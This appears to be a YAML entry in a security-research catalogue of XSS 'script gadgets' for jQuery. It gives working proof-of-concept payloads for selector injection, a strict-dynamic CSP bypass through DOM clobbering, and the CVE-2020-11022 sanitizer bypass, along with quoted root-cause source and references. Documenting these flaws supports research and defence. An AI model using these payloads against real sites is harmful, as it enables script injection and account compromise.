---
description: jQuery is a fast, small, and feature-rich JavaScript library. It makes things like HTML document traversal and manipulation, event handling, animation, and Ajax much simpler with an easy-to-use API that works across a multitude of browsers. With a combination of versatility and extensibility, jQuery has changed the way that millions of people write JavaScript.
github: jquery/jquery
gadgets:
  Latest (1):
    authors:
      - dmethvin
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - img-tag
      - src-attr
      - on-attr
      - func-call-parameter
    pocs:
      - description: In the past, [jQuery](https://github.com/jquery/jquery) was vulnerable to XSS when an HTML string was passed to the `$("<html-input>")` function as the selector. This was widely abused, especially with `$(location.hash)`, because browsers were URL-decoding `location.hash`. The issue was fixed in 2011 by ensuring that HTML parsing only occurs when the string begins with `<`. Because of this, fully controlling a [jQuery](https://github.com/jquery/jquery) selector allows to execute javascript.
        code: |
          <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.js"></script>
          <script >
            $(document).ready(function(){
                // user input
                $("<img src=x onerror=alert(document.domain)>");
            });
          </script>
    links:
      - https://bugs.jquery.com/ticket/9521/
      - https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event
  Latest (2):
    authors:
      - twitter:slekies
      - twitter:kkotowicz
      - twitter:sirdarckcat
    tags:
      - chrome-browser
      - safari-browser
      - script-tag
      - any-attr
      - strict-dynamic-csp
      - before-func-call
    pocs:
      - description: This one works with every [jQuery](https://github.com/jquery/jquery) methods that manipulate HTML elements (see `$(".child" on the right)`) → `.after`, `.before`, `.append`, `.prepend`, `.html`, `.text`, `.replaceWith`, `.wrap`, `.wrapAll`, `.wrapInner`, etc.
        code: |
          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.js"></script>
          <script nonce="secret">
            $(document).ready(function(){
                $( ".container" ).append( $( ".child" ) );
            });
          </script>

          <!-- user input -->
          <form class="child"><input name="ownerDocument"/><script>alert(document.domain);</script></form>
          <p class="container"></p>
    links:
      - https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
      - https://github.com/google/security-research-pocs/blob/master/script-gadgets/repo/csp/sd/jquery.php
      - https://github.com/google/security-research-pocs/blob/master/script-gadgets/repo/csp/sd/jquery_exploit.php
  ≤3.4.1:
    cve: CVE-2020-11022
    authors:
      - twitter:kinugawamasato
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - text-tags
      - any-attr
      - func-call-parameter
    pocs:
      - description: jQuery used to normalize HTML before inserting it into the DOM using the `jQuery.htmlPrefilter` function. This made it easy to bypass sanitizers like DOMPurify.
        code: |
          <script	src="https://code.jquery.com/jquery-3.4.1.js"></script>
          <script>
              $(document).ready(function() {
                  $(document.body).html(`
                      <!-- user input -->
                      <style><x x="><style/><img src=x onerror=alert(document.domain)>"></x></style>
                  `);
              });
          </script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/jquery/jquery/blob/75f7e963708b60f37a42b777f35825d33c4f8e7a/src/manipulation.js#L403">https://github.com/jquery/jquery/blob/75f7e963708b60f37a42b777f35825d33c4f8e7a/src/manipulation.js#L403</a>

      ```javascript
      html: function( value ) {
        return access( this, function( value ) {
          var elem = this[ 0 ] || {},
            i = 0,
            l = this.length;

          if ( value === undefined && elem.nodeType === 1 ) {
            return elem.innerHTML;
          }

          // See if we can take a shortcut and just use innerHTML
          if ( typeof value === "string" && !rnoInnerhtml.test( value ) &&
            !wrapMap[ ( rtagName.exec( value ) || [ "", "" ] )[ 1 ].toLowerCase() ] ) {

            value = jQuery.htmlPrefilter( value );

            try {
              for ( ; i < l; i++ ) {
                elem = this[ i ] || {};

                // Remove element nodes and prevent memory leaks
                if ( elem.nodeType === 1 ) {
                  jQuery.cleanData( getAll( elem, false ) );
                  elem.innerHTML = value;
                }
              }
      ```

      Source: <a target="_blank" href="https://github.com/jquery/jquery/blob/75f7e963708b60f37a42b777f35825d33c4f8e7a/src/manipulation.js#L240">https://github.com/jquery/jquery/blob/75f7e963708b60f37a42b777f35825d33c4f8e7a/src/manipulation.js#L240</a>

      ```javascript
      htmlPrefilter: function( html ) {
        return html.replace( rxhtmlTag, "<$1></$2>" );
      },
      ```
    links:
      - https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/
      - https://github.com/jquery/jquery/security/advisories/GHSA-gxr4-xjj5-5px2
      - https://github.com/jquery/jquery/commit/90fed4b453a5becdb7f173d9e3c1492390a1441f
      - https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#cve-2020-11022-jquery-lte-3.4.1
---
